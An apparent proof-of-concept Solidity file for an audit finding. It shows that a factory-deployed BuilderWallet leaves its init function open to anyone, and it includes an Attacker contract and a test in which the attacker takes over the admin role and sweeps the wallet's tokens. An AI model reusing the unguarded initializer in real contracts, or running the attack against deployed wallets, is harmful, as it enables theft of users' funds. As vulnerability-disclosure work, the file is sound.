// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

library Errors {
    error NotBuilder();
    error ZeroAddress();
    error TransferFailed(address token, address from, uint256 amount, uint256 balance);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract BuilderWallet {
    address public immutable FACTORY;
    address public builderAdmin;

    constructor(address factory) {
        FACTORY = factory;
    }

    function init(address _builderAdmin) external {
        builderAdmin = _builderAdmin;
    }

    function sweep(address token, address to) external {
        if (msg.sender != builderAdmin) revert Errors.NotBuilder();

        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal == 0) return;

        bool ok = IERC20(token).transfer(to, bal);
        if (!ok) {
            revert Errors.TransferFailed(token, address(this), bal, bal);
        }
    }
}

library Create2Lib {
    function deploy(
        uint256 value,
        bytes32 salt,
        bytes memory code
    ) internal returns (address addr) {
        assembly {
            addr := create2(value, add(code, 0x20), mload(code), salt)
        }
        require(addr != address(0), "CREATE2 failed");
    }
}

contract BuilderFactory {
    using Create2Lib for uint256;

    address public immutable OWNER;

    constructor(address owner) {
        if (owner == address(0)) revert Errors.ZeroAddress();
        OWNER = owner;
    }

    modifier onlyOwner() {
        _onlyOwner();
        _;
    }

    function _onlyOwner() internal {
        require(msg.sender == OWNER, "NOT_OWNER");
    }

    function deployBuilder(
        uint48 builderCode,
        address builderAdmin
    ) external onlyOwner returns (address wallet) {
        bytes32 salt = bytes32(uint256(builderCode));

        bytes memory initCode = abi.encodePacked(
            type(BuilderWallet).creationCode,
            abi.encode(address(this))
        );

        wallet = Create2Lib.deploy(0, salt, initCode);
        BuilderWallet(wallet).init(builderAdmin);
    }
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Attacker {
    function attack(BuilderWallet wallet, address token) external {
        wallet.init(address(this));
        wallet.sweep(token, address(this));
    }
}

contract BuilderWalletInitPoC {
    function test_builderWalletInitCanBeOverwritten() public {
        BuilderFactory factory = new BuilderFactory(address(this));
        address legitAdmin = address(0xBEEF);
        address walletAddr = factory.deployBuilder(123, legitAdmin);
        BuilderWallet wallet = BuilderWallet(walletAddr);

        MockERC20 token = new MockERC20();
        token.mint(walletAddr, 100 ether);

        Attacker attacker = new Attacker();
        attacker.attack(wallet, address(token));

        address stolen = wallet.builderAdmin();
        assert(stolen == address(attacker));
        assert(token.balanceOf(walletAddr) == 0);
    }
}
